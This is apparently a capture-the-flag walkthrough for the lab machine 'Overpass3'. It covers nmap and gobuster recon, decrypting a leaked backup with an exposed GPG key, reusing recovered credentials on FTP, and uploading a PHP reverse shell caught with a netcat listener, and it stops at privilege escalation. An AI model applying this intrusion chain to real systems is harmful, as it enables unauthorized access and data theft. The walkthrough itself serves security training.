# Overpass3

Ok so no instructions, nothing. Just three spaces for web/user/root flags.

Nice.


## Recon

we run the nmap scan and the gobuster parallely, while we explore the website.

`❯ nmap -script=vuln -sV -A -T4 10.10.16.10`

```
❯ nmap -script=vuln -sV -A -T4 -Pn 10.10.16.10
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 21:54 EST
Nmap scan report for 10.10.16.10
Host is up (0.52s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.37 (centos)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.52 seconds
```

`❯ gobuster dir -u 10.10.16.10 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"`

well this didn't workout well. But, from the nmap scan, we have two directories listed:

`/backups/ & /icons/`

`/icons/` did not have anything interesting, so lets look at `/backups/`. We have a zip file as `backup.zip`. Downloading and unzipping,

```
❯ unzip backup.zip
Archive:  backup.zip
 extracting: CustomerDetails.xlsx.gpg  
  inflating: priv.key 
```

```
❯ gpg --import priv.key
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

```
❯ gpg CustomerDetails.xlsx.gpg
gpg: WARNING: no command supplied.  Trying to guess what you mean ...
gpg: encrypted with 2048-bit RSA key, ID 9E86A1C63FB96335, created 2020-11-08
      "Paradox <paradox@overpass.thm>"
```

Nice, we have all the customer details neatly bundled up for us. Now, lets convert the `xlsx` to `pdf`.

So we have some customer names and their username-password combinations and, some credit card information XD

lets try logging in using this from ftp. `paradox` username works! okay okay. lets try putting a file on the server using `put filename`. So that works too. Lets upload a php reverse shell and see how that works. Don't forget to change the `$ip` to your `tun0`.

Meanwhile, setup netcat to listen on the port specified. I did not change so its `1234` for me. 

`❯ nc -lnvp 1234`

So, lets execute the shell on there. How? just curl!

`❯ curl 10.10.16.10/shell.php`


```
listening on [any] 1234 ...
connect to [10.2.60.96] from (UNKNOWN) [10.10.16.10] 54190
Linux localhost.localdomain 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:45:42 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (855): Inappropriate ioctl for device
sh: no job control in this shell
```

works!

so now we need to escalate priviledges ...
